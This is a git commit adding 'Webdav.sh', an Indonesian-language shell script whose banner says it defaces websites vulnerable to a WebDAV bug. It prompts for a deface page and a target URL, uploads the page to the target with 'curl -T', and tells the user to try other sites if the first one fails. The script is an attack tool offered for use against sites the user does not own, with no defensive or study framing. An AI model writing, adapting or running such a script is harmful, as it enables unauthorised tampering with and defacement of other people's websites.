652b25a7035ee77cdc92e6826fee8c935a9193d1
ekaseptiawan1 <71901496+ekaseptiawan1@users.noreply.github.com>
2021-03-28 00:39:32 +0700

    Add files via upload

---
+++ Webdav.sh
@@ -0,0 +1,41 @@
+#!/usr/bin/fish
+# Jangan Recode Ya :V
+# Recode Tidak Membuatmu Jadi Pencipta Kode :D
+# Kalo Mau Recode Cantumin Nick Gw Ajg ! :v
+# Selamat Menikmati :V
+
+clear
+toilet -f future '    WEBDAV' | lolcat
+echo
+echo 'Creator : ./FUKUR0-3XP' | lolcat
+echo 'YouTube : Jejak Cyber ' | lolcat
+echo
+echo '''
+SCRIPT INI BERFUNGSI UNTUK MENDEFACE WEBSITE
+YANG VULN / RENTAN TERHADAP BUG WEBDAV
+''' | lolcat
+echo
+echo 'Example : script.html' | lolcat
+echo '_:: NAMA SCRIPT DEFACE KALIAN ::_' | lolcat
+echo
+read sc
+echo
+echo 'Example : http://site.com' | lolcat
+echo '_:: SITE TARGET KALIAN ::_' | lolcat
+echo
+read target
+echo
+echo 'PROSES ...' | lolcat
+sleep 2
+echo
+echo
+curl -T /storage/emulated/0/$sc $target
+echo 'HASIL : '$target/$sc | lolcat
+echo '''
+JIKA HASILNYA TERDEFACE BERARTI WEBSITE
+TERSEBUT VULN WEBDAV. JIKA TIDAK, CARI TARGET
+YANG LAIN :)
+''' | lolcat
+
+
+
